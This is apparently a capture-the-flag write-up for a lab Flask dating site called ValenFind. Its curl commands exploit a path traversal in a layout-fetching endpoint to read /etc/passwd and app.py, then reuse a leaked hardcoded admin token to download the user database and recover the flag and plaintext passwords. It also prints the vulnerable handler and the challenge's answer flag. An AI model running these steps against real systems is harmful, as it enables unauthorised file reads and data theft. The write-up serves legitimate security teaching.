# ValenFind — Full Walkthrough

## 1. Recon

Browsing the root page shows a Valentine's-themed dating site ("ValenFind - Secure Dating") with `Login` and `Sign Up`. The response header confirms it's Flask:

```
Server: Werkzeug/3.0.1 Python/3.12.3
```

### 1.1 Register an account

Registration needs no email verification, so grab a session immediately:

```bash
curl -s -c cookies.txt -b cookies.txt \
     -d "username=hacker1&password=Pass123!" \
     http://10.48.180.177:5000/register
```

You get a signed Flask session cookie and are redirected to `/complete_profile`. The complete-profile page drops a hint:

> *"(Your secrets are safe with us... mostly.)"*

### 1.2 Map authenticated endpoints

After logging in, the nav exposes:

- `/dashboard` — grid of 8 seeded user profiles (ids 1–8), with `/profile/<username>` and `/like/<id>` links
- `/my_profile` — edit your own profile
- `/profile/<username>` — public profile view

---

## 2. Finding the vulnerability

View any profile, e.g. `/profile/cupid`, and read the page's JavaScript:

```javascript
function loadTheme(layoutName) {
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => { ... });
}
```

A profile "theme selector" fetches a file from the server via a **user-controlled `layout` parameter**:

```
GET /api/fetch_layout?layout=theme_classic.html
```

Any endpoint that reads a file from a name you control is a path-traversal candidate.

---

## 3. Exploiting the Path Traversal (LFI)

### 3.1 Confirm it

```bash
curl -s -b cookies.txt \
  "http://10.48.180.177:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

Returns `/etc/passwd` — **arbitrary file read confirmed.**

An error message leaks the base directory:

```
Error loading theme layout: [Errno 2] No such file or directory:
'/opt/Valenfind/templates/components/../app.py'
```

So files resolve under `/opt/Valenfind/templates/components/`. That means the app source is two levels up.

### 3.2 Leak the application source

```bash
curl -s -b cookies.txt \
  "http://10.48.180.177:5000/api/fetch_layout?layout=../../app.py"
```

The vulnerable handler has **no sanitization** — only a weak blocklist:

```python
@app.route('/api/fetch_layout')
def fetch_layout():
    layout_file = request.args.get('layout', 'theme_classic.html')

    if 'cupid.db' in layout_file or layout_file.endswith('.db'):
        return "Security Alert: Database file access is strictly prohibited."
    if 'seeder.py' in layout_file:
        return "Security Alert: Configuration file access is strictly prohibited."

    base_dir = os.path.join(os.getcwd(), 'templates', 'components')
    file_path = os.path.join(base_dir, layout_file)   # <-- no ../ filtering
    with open(file_path, 'r') as f:
        return f.read()
```

The blocklist only blocks `*.db` and `seeder.py`. Reading `app.py` is not blocked — and it contains the secrets.

---

## 4. Escalating via the leaked secrets

The source reveals two critical items:

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'
```

and a hidden admin route that exports the entire database to anyone presenting that token in a header:

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
    return jsonify({"error": "Forbidden", ...}), 403
```

The `.db` blocklist in step 3 was meant to stop us stealing the database directly — but this export route hands it over for a token we just read from the source.

> Note: `app.secret_key = os.urandom(24)` is random per boot, so the session cookie **can't** be forged offline. The intended path is LFI → source → token reuse, which is exactly this.

---

## 5. Dumping the database & grabbing the flag

```bash
curl -s -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     "http://10.48.180.177:5000/api/admin/export_db" -o valenfind_leak.db

# Fastest look:
strings valenfind_leak.db | grep -i flag
```

Or dump it properly:

```bash
sqlite3 valenfind_leak.db \
  "SELECT username, password, address FROM users;"
```

The admin account `cupid` hides the flag in its **address** field (and exposes every user's plaintext password as a bonus):

```
cupid | admin_root_x99 | FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```

### Flag

```
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
```
